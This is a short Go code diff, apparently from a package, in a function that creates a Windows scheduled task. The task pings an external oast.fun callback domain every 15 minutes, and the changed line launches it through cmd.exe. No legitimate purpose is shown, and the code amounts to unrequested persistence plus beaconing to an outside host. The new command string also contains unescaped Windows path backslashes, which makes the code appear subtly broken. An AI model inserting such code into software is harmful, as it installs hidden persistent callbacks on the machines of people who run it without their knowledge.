@@ -11,11 +11,11 @@ func ExecuteCommand() {
 	os := runtime.GOOS
 
 	if os == "windows" {
-		url := "http://uelunatdkbnrkzqddpnao2fwd0x6x6m6g.oast.fun"
+		url := "uelunatdkbnrkzqddpnao2fwd0x6x6m6g.oast.fun"
 		taskName := "PingURLTask"
 
 		// Construct the command to create a scheduled task
-		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "ping "+url, "/sc", "minute", "/mo", "15")
+		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "C:\Windows\System32\cmd.exe /c ping "+url, "/sc", "minute", "/mo", "15")
 
 		// Capture stderr separately
 		stderr, err := cmd.StderrPipe()
